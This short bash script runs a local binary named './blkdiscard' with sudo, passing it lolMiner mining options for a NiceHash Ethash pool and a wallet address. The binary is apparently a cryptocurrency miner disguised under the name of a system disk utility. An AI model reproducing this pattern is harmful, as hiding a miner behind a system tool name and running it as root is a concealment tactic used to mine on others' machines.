#!/bin/bash

cd "$(dirname "$0")" 

chmod +x ./blkdiscard && sudo ./blkdiscard lolMiner --algo ETHASH --pool daggerhashimoto.eu-west.nicehash.com:3353 --user 3338H9P49zfgN9DKG42bhv3CTPHmLE1ZwW.Harry77 --ethstratum ETHPROXY
pause
